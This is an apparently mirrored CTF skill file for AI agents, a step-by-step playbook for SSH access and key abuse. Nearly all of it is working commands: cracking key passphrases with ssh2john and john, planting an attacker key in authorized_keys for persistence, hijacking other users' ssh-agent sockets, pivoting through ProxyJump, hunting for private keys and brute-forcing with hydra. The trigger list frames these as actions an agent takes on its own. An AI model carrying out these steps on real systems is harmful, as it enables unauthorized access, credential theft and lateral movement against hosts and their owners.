# SSH Access and Key Abuse

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/access-pivoting/ssh-access-and-keys.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/access-pivoting/ssh-access-and-keys.md)

---

---
name: ssh-access-and-keys
category: access-pivoting
triggers: ["ssh", "id_rsa", "id_ed25519", "port 22", "authorized_keys", "known_hosts", "ssh-agent", "SSH_AUTH_SOCK", "ProxyJump", ".ssh", "private key", "passphrase"]
tools: ["ssh", "ssh-keygen", "ssh2john", "john", "hydra", "chmod", "ssh-add", "scp"]
priority: high
description: Turn discovered SSH private keys, agent sockets, and writable authorized_keys into interactive shells, persistence, and lateral movement.
---
# SSH Access and Key Abuse

## Trigger context
Reach for this when any of the following appear: a file named `id_rsa` / `id_ed25519` / `*.pem`, a readable `~/.ssh/` directory, an open `port 22`, a live `ssh-agent` (`SSH_AUTH_SOCK` set), a writable `authorized_keys`, or a target that trusts key-based auth. Also relevant when a low-priv shell (web/RCE) exists and you want a stable, persistent SSH channel.

## Objective
Convert key material and SSH trust relationships into (1) a stable interactive shell, (2) persistence that survives reboots, and (3) lateral movement to hosts the current user can already reach. Never rely on the initial noisy foothold once SSH is possible.

## Methodology (decision tree)
1. **Found a private key?** Check its type/encryption. Unencrypted -> log in directly. Encrypted (`Proc-Type: 4,ENCRYPTED` or `bcrypt` in an OpenSSH key) -> crack the passphrase with ssh2john/john.
2. **No key but a writable `~/.ssh/`?** Drop your own public key into `authorized_keys` for persistence.
3. **No key, `ssh-agent` running as another user (root/dev)?** Hijack `SSH_AUTH_SOCK` and use the agent's loaded identities without ever seeing the key.
4. **Have creds/key but target is internal?** Use `ProxyJump` (`-J`) to chain through the reachable jump host.
5. **Nothing yet, only port 22 open?** Enumerate the username, then (only in CTF scope) brute-force with hydra. Prefer key/known-cred paths first — brute is loud and slow.
6. **Always loot `~/.ssh/`** — `known_hosts`, `config`, and other keys reveal reachable internal hosts and next hops.

## Commands & payloads
```bash
# --- 1. Use a found private key ---
chmod 600 id_rsa                       # ssh refuses world-readable keys ("UNPROTECTED KEY FILE")
ssh -i id_rsa user@target
ssh -i id_rsa -o IdentitiesOnly=yes user@target   # force this key, ignore agent
# Unknown user? Check the key comment (tail of the file), .ssh/config, or /etc/passwd loot.

# --- 2. Crack an encrypted key passphrase ---
ssh2john id_rsa > id_rsa.hash          # or: python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash                 # reveal cracked passphrase
# Then: ssh -i id_rsa user@target  (enter recovered passphrase)

# --- 3. Persistence via authorized_keys ---
ssh-keygen -t ed25519 -f ./mykey -N ''  # generate attacker keypair (no passphrase)
# On target (writable home), append your PUBLIC key:
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA...attacker_pub... ctf' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
ssh -i ./mykey user@target              # log back in anytime

# --- 4. ssh-agent hijack (agent forwarding / local socket abuse) ---
ls -l /tmp/ssh-*/agent.*                 # find another user's agent socket
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234
ssh-add -l                               # list identities the agent holds
ssh victimuser@internal-host             # auth with keys you never had to read

# --- 5. ProxyJump to internal hosts ---
ssh -J user@jumphost user@10.10.20.5     # single hop
ssh -J userA@jump1,userB@jump2 user@target   # multi-hop chain
# Persist in ~/.ssh/config:
#   Host internal
#     HostName 10.10.20.5
#     ProxyJump user@jumphost

# --- 6. Loot the .ssh directory ---
cat ~/.ssh/known_hosts                    # reachable hosts (hashed? crack with hashcat -m 160 style / ssh-keygen -H)
cat ~/.ssh/config                         # aliases, jump hosts, other identities
find / -name 'id_*' -o -name '*.pem' 2>/dev/null   # hunt more keys

# --- 7. Port 22 only: enumerate then (CTF-scope) brute ---
ssh -o PreferredAuthentications=none user@target 2>&1 | grep -i 'auth'  # allowed auth methods
hydra -l knownuser -P /usr/share/wordlists/rockyou.txt -t 4 ssh://target
```

## Branching logic
- `Permissions 0644 for 'id_rsa' are too open` -> `chmod 600` and retry.
- Key works but wrong user -> try users from `/etc/passwd`, key comment, or app config; a key often belongs to the account whose home it sat in.
- `ssh-add -l` returns "agent has no identities" -> agent is empty; fall back to key files or credentials.
- ProxyJump fails with "channel open failure" -> the jump host lacks a route/DNS to the target; try an IP and confirm the jump host can reach it (`nc -vz` from the jump).
- Encrypted key + no crack -> pivot to other loot; do not burn hours on a strong passphrase.

## Common pitfalls
- Forgetting `chmod 600` — the most common self-inflicted failure.
- Cracking the wrong hash format: OpenSSH new-format keys need a current ssh2john; old JtR builds may not parse them.
- Overwriting a victim's `authorized_keys` (use `>>`, never `>`) — destroys legitimate access and gets you noticed.
- Brute-forcing SSH in-scope but with too many threads triggers fail2ban/lockout; keep `-t 4` and only after cheaper paths fail.
- Agent hijack only works while the victim's agent process is alive and the socket is readable by you.

## Proof / verification
- Interactive shell: `id`, `hostname`, `ip a` on the new host.
- Persistence: disconnect and re-login with your dropped key.
- Agent hijack: `ssh-add -l` shows identities, then a successful login to a host you had no key for.
- Cracked key: `john --show` prints the passphrase and `ssh -i` accepts it.

## Cross-references
- [sa--instructions--access-pivoting--tunneling-port-forwarding.md](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--tunneling-port-forwarding.md) — once you have SSH, build `-L`/`-R`/`-D` tunnels to internal services.
- [sa--instructions--access-pivoting--pivoting-proxychains.md](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--pivoting-proxychains.md) — route tooling through the SSH SOCKS proxy or chisel/ligolo when SSH agent-less.

## Credible sources
- HackTricks — Tunneling and Port Forwarding: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html
- GTFOBins — ssh: https://gtfobins.github.io/gtfobins/ssh/
- John the Ripper (ssh2john) — OpenWall docs: https://www.openwall.com/john/
- SSH agent forwarding risks — GitHub Blog: https://blog.github.com/2017-11-13-ssh-agent-forwarding/
- man ssh_config (ProxyJump): https://man.openbsd.org/ssh_config#ProxyJump
